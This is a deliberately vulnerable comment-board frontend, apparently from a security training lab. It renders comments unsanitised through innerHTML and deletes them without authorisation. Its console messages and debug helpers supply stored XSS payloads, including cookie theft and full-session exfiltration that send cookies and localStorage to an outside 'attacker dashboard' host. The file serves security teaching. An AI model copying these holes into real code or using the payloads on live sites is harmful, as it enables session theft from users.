// ============================================
// ACME Corp Comment Board - Frontend
// Educational Use Only - STORED XSS VULNERABILITY
// ============================================

console.log('%c⚠️ COMMENT BOARD - STORED XSS VULNERABILITY', 'background: #dc3545; color: white; font-size: 16px; font-weight: bold; padding: 10px;');
console.log('%c🔴 RED TEAM: Post XSS payloads to affect ALL users!', 'background: #dc3545; color: white; font-size: 14px; font-weight: bold; padding: 5px;');
console.log('Try: <img src=x onerror=alert(1)>');
console.log('Or: <img src=x onerror=alert(document.cookie)>');

// Check if user is logged in
let currentUsername = 'Anonymous';

// Load comments on page load
document.addEventListener('DOMContentLoaded', () => {
  loadComments();
  checkCurrentUser();
});

function checkCurrentUser() {
  // Try to get current session user
  fetch('/api/users')
    .then(res => res.json())
    .then(data => {
      // This is just for display, we're not actually checking auth
      document.getElementById('currentUser').textContent = currentUsername;
    })
    .catch(err => {
      console.log('Not logged in, posting as Anonymous');
    });
}

// ❌ VULNERABILITY: Load comments and display without sanitization
async function loadComments() {
  try {
    const response = await fetch('/api/comments');
    const data = await response.json();
    
    const container = document.getElementById('commentsContainer');
    const countElement = document.getElementById('commentCount');
    
    if (!data.comments || data.comments.length === 0) {
      container.innerHTML = '<div class="text-center text-muted"><p>No comments yet. Be the first to post!</p></div>';
      countElement.textContent = '0';
      return;
    }
    
    // ❌ STORED XSS VULNERABILITY: Using innerHTML without sanitization!
    container.innerHTML = '';
    
    data.comments.forEach(comment => {
      const commentDiv = document.createElement('div');
      commentDiv.className = 'comment-item border-bottom pb-3 mb-3';
      
      // ❌ CRITICAL VULNERABILITY: Using innerHTML allows XSS!
      commentDiv.innerHTML = `
        <div class="d-flex justify-content-between align-items-start">
          <div class="flex-grow-1">
            <div class="d-flex align-items-center mb-1">
              <strong class="text-primary">${comment.username}</strong>
              <small class="text-muted ms-2">${new Date(comment.timestamp).toLocaleString()}</small>
            </div>
            <div class="comment-text">
              ${comment.text}
            </div>
          </div>
          <button class="btn btn-sm btn-outline-danger" onclick="deleteComment(${comment.id})">
            🗑️
          </button>
        </div>
      `;
      
      container.appendChild(commentDiv);
    });
    
    countElement.textContent = data.comments.length;
    
    console.log(`✅ Loaded ${data.comments.length} comments (UNSANITIZED!)`);
  } catch (error) {
    console.error('Load comments error:', error);
    document.getElementById('commentsContainer').innerHTML = 
      '<div class="alert alert-danger">Failed to load comments</div>';
  }
}

// ❌ VULNERABILITY: Post comment without sanitization
async function postComment() {
  const textarea = document.getElementById('commentText');
  const text = textarea.value.trim();
  
  if (!text) {
    alert('Please enter a comment');
    return;
  }
  
  try {
    // ❌ VULNERABILITY: Sending unsanitized user input to server
    const response = await fetch('/api/comments', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text })  // ❌ No sanitization!
    });
    
    const data = await response.json();
    
    if (response.ok) {
      console.log('✅ Comment posted (UNSANITIZED!):', data);
      textarea.value = '';
      loadComments();  // Reload to show new comment (and execute XSS!)
      
      // Show success
      showNotification('Comment posted successfully!', 'success');
    } else {
      alert(data.error || 'Failed to post comment');
    }
  } catch (error) {
    console.error('Post comment error:', error);
    alert('Failed to post comment');
  }
}

// ❌ VULNERABILITY: Delete comment without authorization
async function deleteComment(commentId) {
  if (!confirm('Delete this comment?')) return;
  
  try {
    const response = await fetch(`/api/comments/${commentId}`, {
      method: 'DELETE'
    });
    
    const data = await response.json();
    
    if (response.ok) {
      console.log(`✅ Comment ${commentId} deleted (No auth check!)`);
      loadComments();
      showNotification('Comment deleted', 'info');
    } else {
      alert(data.error || 'Failed to delete comment');
    }
  } catch (error) {
    console.error('Delete comment error:', error);
  }
}

// Clear all comments (admin function - exposed to all!)
async function clearAllComments() {
  try {
    // Get all comments
    const response = await fetch('/api/comments');
    const data = await response.json();
    
    // Delete each one
    for (const comment of data.comments) {
      await fetch(`/api/comments/${comment.id}`, { method: 'DELETE' });
    }
    
    console.log('✅ All comments cleared');
    loadComments();
    showNotification('All comments cleared!', 'warning');
  } catch (error) {
    console.error('Clear comments error:', error);
  }
}

// Helper: Show notification
function showNotification(message, type = 'info') {
  const notification = document.createElement('div');
  notification.className = `alert alert-${type} position-fixed top-0 end-0 m-3`;
  notification.style.zIndex = '9999';
  notification.textContent = message;
  document.body.appendChild(notification);
  
  setTimeout(() => {
    notification.remove();
  }, 3000);
}

// ===== DEBUG HELPERS =====

console.log('\n%c💡 Try these stored XSS attacks:', 'font-weight: bold; font-size: 12px;');
console.log('1. Basic XSS: <img src=x onerror=alert(1)>');
console.log('2. Cookie theft: <img src=x onerror="fetch(\'https://project-1-17.eduhk.hk/exfil?data=\'+document.cookie)">');
console.log('3. Full exfil: Use debugComments.loadFullExfil()');
console.log('\n%c⚠️ These attacks persist and affect ALL users!', 'font-weight: bold; color: #dc3545;');
console.log('%c🎯 View stolen data: https://project-1-17.eduhk.hk/', 'font-weight: bold; color: #00ff00;');

// Expose helpful functions
window.debugComments = {
  loadXSS: function() {
    document.getElementById('commentText').value = '<img src=x onerror=alert(1)>';
    console.log('✅ Basic XSS payload loaded in comment box');
  },
  
  loadCookieTheft: function() {
    document.getElementById('commentText').value = '<img src=x onerror="fetch(\'https://project-1-17.eduhk.hk/exfil?data=\'+document.cookie)">';
    console.log('✅ Cookie theft payload loaded (sends to attacker server)');
    console.log('🎯 View stolen data at: https://project-1-17.eduhk.hk/');
  },
  
  loadFullExfil: function() {
    document.getElementById('commentText').value = '<img src=x onerror="fetch(\'https://project-1-17.eduhk.hk/exfil\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:JSON.stringify({cookie:document.cookie,localStorage:JSON.stringify(localStorage),url:location.href})})">';
    console.log('✅ Full session exfiltration payload loaded');
    console.log('🎯 View stolen data at: https://project-1-17.eduhk.hk/');
  },
  
  loadDefacement: function() {
    document.getElementById('commentText').value = '<img src=x onerror="document.body.style.background=\'red\';alert(1)">';
    console.log('✅ Defacement payload loaded');
  },
  
  help: function() {
    console.log('%c🔴 Debug Commands', 'background: #dc3545; color: white; padding: 5px;');
    console.log('debugComments.loadXSS() - Load basic XSS');
    console.log('debugComments.loadCookieTheft() - Load cookie theft (sends to attacker)');
    console.log('debugComments.loadFullExfil() - Load full session exfiltration');
    console.log('debugComments.loadDefacement() - Load defacement XSS');
    console.log('\n🎯 Attacker dashboard: https://project-1-17.eduhk.hk/');
  }
};

console.log('\n💡 Type debugComments.help() for attack shortcuts');
